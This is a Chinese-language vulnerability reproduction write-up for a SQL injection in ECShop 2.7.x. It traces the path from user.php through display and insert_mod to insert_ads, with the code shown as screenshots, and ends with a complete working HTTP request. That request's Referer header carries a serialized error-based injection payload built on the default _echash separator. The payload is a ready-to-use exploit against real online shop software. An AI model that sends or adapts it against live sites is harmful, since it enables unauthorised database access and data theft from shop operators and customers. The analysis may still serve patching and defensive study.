ECShop \<= 2.7.x sql注入漏洞
============================

一、漏洞简介
------------

二、漏洞影响
------------

ECShop（2.x、3.0.x、3.6.x）

三、复现过程
------------

### 漏洞分析

先看user.php

![](./.resource/ECShop<=2.7.xsql注入漏洞/media/rId25.png)

\$back\_act变量来源于HTTP\_REFERER，我们可控。

assign函数用于在模版变量里赋值

![](./.resource/ECShop<=2.7.xsql注入漏洞/media/rId26.png)

再看display函数

![](./.resource/ECShop<=2.7.xsql注入漏洞/media/rId27.png)

读取user\_passport.dwt模版文件内容，显示解析变量后的html内容，用\_echash做分割，得到\$k然后交给isnert\_mod处理，由于\_echash是默认的，不是随机生成的，所以\$val内容可随意控制。

再看insert\_mod函数

![](./.resource/ECShop<=2.7.xsql注入漏洞/media/rId28.png)

非常关键的一个地方，这里进行了动态调用

\$val传入进来用\|分割，参数传入进来时需要被序列化

再看include/lib\_insert.php中的insert\_ads函数

![](./.resource/ECShop<=2.7.xsql注入漏洞/media/rId29.png)

可以看到这里直接就能注入了

### payload

    GET /user.php?act=login HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0

![](./.resource/ECShop<=2.7.xsql注入漏洞/media/rId31.png)

参考链接
--------

> https://cloud.tencent.com/developer/article/1333449
